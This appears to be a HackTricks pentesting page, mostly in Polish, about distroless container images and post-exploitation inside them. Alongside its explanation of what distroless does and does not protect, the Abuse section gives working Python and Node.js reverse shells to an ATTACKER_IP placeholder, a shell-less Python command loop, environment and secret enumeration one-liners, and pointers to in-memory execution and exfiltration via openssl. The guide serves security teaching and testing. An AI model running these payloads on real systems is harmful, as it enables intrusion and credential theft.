# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Obraz kontenera **distroless** to obraz, który zawiera **minimalne komponenty runtime potrzebne do uruchomienia jednej, konkretnej aplikacji**, przy jednoczesnym celowym usunięciu typowych narzędzi dystrybucyjnych, takich jak menedżery pakietów, shelle i duże zestawy ogólnych narzędzi userland. W praktyce obrazy distroless często zawierają tylko binarkę aplikacji lub runtime, jej biblioteki współdzielone, pakiety certyfikatów oraz bardzo uproszczony układ systemu plików.

Chodzi nie o to, że distroless jest nową prymitywną izolacją jądra. Distroless to strategia projektowania obrazu. Zmienia to, co jest dostępne **wewnątrz** systemu plików kontenera, a nie sposób, w jaki kernel izoluje kontener. To rozróżnienie ma znaczenie, ponieważ distroless utwardza środowisko głównie przez ograniczenie tego, czego atakujący może użyć po uzyskaniu wykonania kodu. Nie zastępuje namespaces, seccomp, capabilities, AppArmor, SELinux ani żadnego innego mechanizmu izolacji w czasie wykonywania.

## Dlaczego powstał Distroless

Obrazy distroless używane są głównie w celu zmniejszenia:

- rozmiaru obrazu
- złożoności operacyjnej obrazu
- liczby pakietów i binarek, które mogą zawierać podatności
- liczby narzędzi post-exploitation dostępnych domyślnie dla atakującego

Dlatego obrazy distroless są popularne w produkcyjnych wdrożeniach aplikacji. Kontener, który nie zawiera shella, menedżera pakietów i prawie żadnych ogólnych narzędzi, jest zwykle łatwiejszy do zrozumienia operacyjnie i trudniejszy do interaktywnego nadużycia po kompromitacji.

Przykłady dobrze znanych rodzin obrazów w stylu distroless to:

- Google's distroless images
- Chainguard hardened/minimal images

## Czego Distroless Nie Oznacza

Obraz distroless **nie** jest:

- automatycznie rootless
- automatycznie non-privileged
- automatycznie read-only
- automatycznie chroniony przez seccomp, AppArmor, lub SELinux
- automatycznie bezpieczny przed container escape

Wciąż możliwe jest uruchomienie obrazu distroless z `--privileged`, współdzieleniem namespace hosta, niebezpiecznymi bind mountami lub zamontowanym socketem runtime. W takiej sytuacji obraz może być minimalny, ale kontener wciąż może być katastrofalnie niebezpieczny. Distroless zmienia powierzchnię ataku userland, a nie granicę zaufania jądra.

## Typowe cechy operacyjne

Kiedy kompromitujesz kontener distroless, pierwsza rzecz, którą zwykle zauważysz, to że powszechne założenia przestają być prawdziwe. Może nie być `sh`, `bash`, `ls`, `id`, `cat`, a czasami nawet środowiska opartego na libc, które zachowuje się tak, jak oczekuje twoje zwykłe tradecraft. Wpływa to zarówno na ofensywę, jak i obronę, ponieważ brak narzędzi utrudnia debugowanie, incident response i post-exploitation.

Najczęstsze wzorce to:

- runtime aplikacji istnieje, ale niewiele więcej
- payloady oparte na shellu zawodzą, ponieważ nie ma shella
- typowe one-linery do enumeracji zawodzą, bo brak pomocniczych binarek
- zabezpieczenia systemu plików, takie jak read-only rootfs lub `noexec` na zapisywalnych lokalizacjach tmpfs, często również występują

To połączenie jest tym, co zwykle prowadzi ludzi do mówienia o "weaponizing distroless".

## Distroless i Post-Exploitation

Głównym wyzwaniem ofensywnym w środowisku distroless nie zawsze jest początkowe RCE. Częściej problem pojawia się dalej. Jeśli zaatakowany workload daje wykonanie kodu w runtime języka takim jak Python, Node.js, Java, czy Go, możesz być w stanie wykonać dowolną logikę, ale nie przez normalne, shell-centrystyczne workflowy, które są częste w innych celach Linux.

To oznacza, że post-exploitation często przechodzi w jedną z trzech dróg:

1. **Użyć istniejącego runtime języka bezpośrednio** do enumeracji środowiska, otwierania socketów, czytania plików lub stage'owania dodatkowych payloadów.
2. **Wrzucić własne narzędzia do pamięci** jeśli system plików jest read-only lub zapisywalne lokalizacje są zamontowane jako `noexec`.
3. **Wykorzystać istniejące binarki obecne w obrazie** jeśli aplikacja lub jej zależności zawierają coś niespodziewanie użytecznego.

## Abuse

### Enumerate The Runtime You Already Have

W wielu kontenerach distroless nie ma shellu, ale wciąż jest runtime aplikacji. Jeśli celem jest serwis Python, Python tam jest. Jeśli celem jest Node.js, Node tam jest. To często daje wystarczającą funkcjonalność do enumeracji plików, odczytu zmiennych środowiskowych, otwarcia reverse shelli i stage'owania wykonania w pamięci bez konieczności wywoływania `/bin/sh`.

A simple example with Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Prosty przykład z Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Wpływ:

- odzyskanie zmiennych środowiskowych, często zawierających poświadczenia lub punkty końcowe usług
- enumeracja systemu plików bez `/bin/ls`
- identyfikacja ścieżek z prawem zapisu i zamontowanych sekretów

### Reverse Shell bez `/bin/sh`

Jeśli obraz nie zawiera `sh` lub `bash`, klasyczny shell-based reverse shell może od razu nie zadziałać. W takiej sytuacji użyj zamiast tego zainstalowanego runtime'u języka.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Jeśli `/bin/sh` nie istnieje, zamień ostatnią linię na bezpośrednie wykonywanie poleceń za pomocą Pythona lub pętlę REPL Pythona.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ponownie, jeśli `/bin/sh` jest nieobecny, użyj bezpośrednio API systemu plików, procesów i sieci Node zamiast uruchamiać powłokę.

### Pełny przykład: No-Shell Python Command Loop

Jeśli obraz ma Python, ale w ogóle nie ma powłoki, prosta pętla interaktywna często wystarczy, aby zachować pełną post-exploitation capability:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
To nie wymaga interaktywnego shell binary. Skutek jest w praktyce taki sam jak podstawowego shell z perspektywy atakującego: wykonywanie poleceń, enumeracja i przygotowanie dalszych payloadów przez istniejący runtime.

### In-Memory Tool Execution

Obrazy distroless są często łączone z:

- `readOnlyRootFilesystem: true`
- zapisywalny, ale `noexec` tmpfs taki jak `/dev/shm`
- brak narzędzi do zarządzania pakietami

That combination makes classic "download binary to disk and run it" workflows unreliable. W takich przypadkach techniki wykonywania w pamięci stają się głównym rozwiązaniem.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Niektóre obrazy distroless nadal zawierają binaria niezbędne operacyjnie, które stają się przydatne po kompromitacji. Jako powtarzający się przykład wymieniany jest `openssl`, ponieważ aplikacje czasami go potrzebują do zadań związanych z crypto- lub TLS.

Szybki wzorzec wyszukiwania to:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` is present, it may be usable for:

- wychodzących połączeń TLS
- data exfiltration przez dozwolony kanał egress
- staging payload data przez encoded/encrypted blobs

Dokładne możliwości nadużycia zależą od tego, co jest faktycznie zainstalowane, ale ogólna idea jest taka, że distroless nie oznacza "no tools whatsoever"; oznacza "far fewer tools than a normal distribution image".

## Checks

Celem tych kontroli jest określenie, czy obraz w praktyce jest naprawdę distroless oraz które runtime lub helper binaries są nadal dostępne do post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Co warto odnotować:

- Jeśli nie ma shella, ale dostępny jest runtime taki jak Python lub Node, post-exploitation powinien przełączyć się na wykonywanie poprzez runtime.
- Jeśli root filesystem jest tylko do odczytu, a `/dev/shm` jest zapisywalny, ale `noexec`, techniki wykonywania w pamięci stają się dużo bardziej istotne.
- Jeśli istnieją pomocnicze binaria takie jak `openssl`, `busybox`, lub `java`, mogą one dostarczyć wystarczającej funkcjonalności, by zbootstrapować dalszy dostęp.

## Domyślne ustawienia runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Kluczowe jest to, że distroless to **właściwość obrazu**, a nie ochrona runtime. Jej wartość wynika ze zmniejszenia tego, co jest dostępne wewnątrz filesystem po kompromitacji.

## Powiązane strony

Dla obejść ograniczeń filesystem i wykonywania w pamięci często potrzebnych w środowiskach distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Dla nadużyć związanych z container runtime, socketami i mountami, które nadal mają zastosowanie do distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
